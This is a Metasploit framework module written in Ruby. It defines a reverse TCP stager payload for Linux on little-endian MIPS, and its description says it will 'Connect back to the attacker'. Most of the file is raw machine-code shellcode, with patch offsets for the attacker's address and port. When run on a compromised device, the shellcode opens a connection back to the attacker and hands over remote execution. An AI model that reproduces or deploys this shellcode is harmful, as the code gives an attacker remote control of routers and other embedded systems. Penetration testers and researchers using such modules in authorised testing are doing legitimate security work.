##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        =>
        [
          'juan vazquez'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ [60, 56], 'ADDR16MSB' ],
              'LPORT' => [ 48, 'n'    ],
            },
          'Payload' =>
            "\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd\xff" +
            "\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01\x01\x01" +
            "\xfc\xff\xa2\xaf\xfc\xff\xa4\x8f\xfd\xff\x0f\x24\x27\x78" +
            "\xe0\x01\xe2\xff\xaf\xaf\x11\x5c\x0e\x34\xe4\xff\xae\xaf" +
            "\x00\x01\x0e\x3c\x7f\x00\xce\x35\xe6\xff\xae\xaf\xe2\xff" +
            "\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24" +
            "\x0c\x01\x01\x01\xff\xff\x04\x24\x01\x10\x05\x24\xff\xff" +
            "\xa5\x20\xf8\xff\x09\x24\x27\x48\x20\x01\x20\x30\x20\x01" +
            "\x02\x08\x07\x24\xea\xff\x0b\x24\x27\x58\x60\x01\x20\x58" +
            "\xab\x03\xff\xff\x60\xad\xfb\xff\x62\xad\xfa\x0f\x02\x24" +
            "\x0c\x01\x01\x01\xf8\xff\xa2\xaf\xfc\xff\xa4\x8f\xf8\xff" +
            "\xa5\x8f\x01\x10\x06\x24\xff\xff\xc6\x20\xa3\x0f\x02\x24" +
            "\x0c\x01\x01\x01\xf8\xff\xb1\x8f\xfc\xff\xb2\x8f\x09\xf8" +
            "\x20\x02"
        }
      ))
  end

end
